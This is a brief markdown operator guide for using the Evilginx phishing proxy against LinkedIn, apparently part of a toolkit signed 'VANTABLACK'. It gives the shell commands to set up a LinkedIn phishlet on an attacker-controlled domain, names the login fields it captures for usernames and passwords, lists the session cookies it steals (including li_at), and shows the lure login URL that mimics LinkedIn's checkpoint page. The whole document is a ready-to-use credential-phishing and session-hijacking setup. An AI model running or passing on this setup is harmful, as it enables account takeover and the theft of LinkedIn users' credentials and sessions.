# Evilginx Guide for LinkedIn

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable linkedin
landers create linkedin
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Email/Username | `session_key` |
| Password | `session_password` |

## Tokens Captured

- `li_at` - Session token (most important)
- `JSESSIONID` - JavaScript session
- `bscookie` - Browser cookie
- `sl` - Security token

## Login URL

```
https://your-domain.com/linkedin/checkpoint/lg/login
```

Redirects from: www.linkedin.com/checkpoint/lg/login

---

**VANTABLACK**
